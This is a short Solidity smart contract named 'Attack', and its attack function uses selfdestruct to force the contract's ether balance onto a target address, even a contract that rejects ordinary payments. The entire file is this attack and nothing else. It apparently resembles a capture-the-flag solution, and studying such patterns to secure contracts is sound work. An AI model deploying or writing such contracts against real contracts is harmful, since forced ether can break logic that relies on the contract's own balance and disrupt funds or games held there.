pragma solidity ^0.8.0;

contract Attack { 
    
    constructor() payable {}

    function attack(address payable target) public {
        selfdestruct(target);
    }
}